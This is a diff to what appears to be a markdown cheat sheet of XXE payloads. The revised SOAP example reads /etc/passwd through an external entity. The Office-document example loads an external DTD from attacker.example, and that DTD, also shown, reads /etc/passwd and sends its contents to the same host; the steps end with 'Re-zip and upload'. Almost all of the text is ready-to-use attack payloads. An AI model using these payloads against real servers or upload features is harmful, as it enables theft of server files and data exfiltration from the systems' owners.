@@ -127,12 +127,18 @@ Using local DTD file override (Linux — `/usr/share/xml/fontconfig/fonts.dtd`):
 
 ### SOAP
 
+Place the DOCTYPE at the document root, before the SOAP envelope:
+
 ```xml
-<soap:Body>
-  <foo>
-    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.example/ext.dtd"> %dtd;]><xxx/>]]>
-  </foo>
-</soap:Body>
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>&xxe;</foo>
+  </soap:Body>
+</soap:Envelope>
 ```
 
 ### SVG Image Upload
@@ -149,10 +155,23 @@ Using local DTD file override (Linux — `/usr/share/xml/fontconfig/fonts.dtd`):
 
 Unzip the document, inject XXE into `word/document.xml` or `xl/workbook.xml`:
 
+Inject into the inner XML (e.g., `word/document.xml` or `xl/sharedStrings.xml`):
+
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://attacker.example/ext.dtd">%asd;%c;]>
+<!DOCTYPE cdl [
+  <!ENTITY % asd SYSTEM "http://attacker.example/ext.dtd">
+  %asd;
+  %c;
+]>
 <cdl>&rrr;</cdl>
+```
+
+**ext.dtd** hosted on attacker server:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://attacker.example/?data=%file;'>">
 ```
 
 Re-zip and upload.
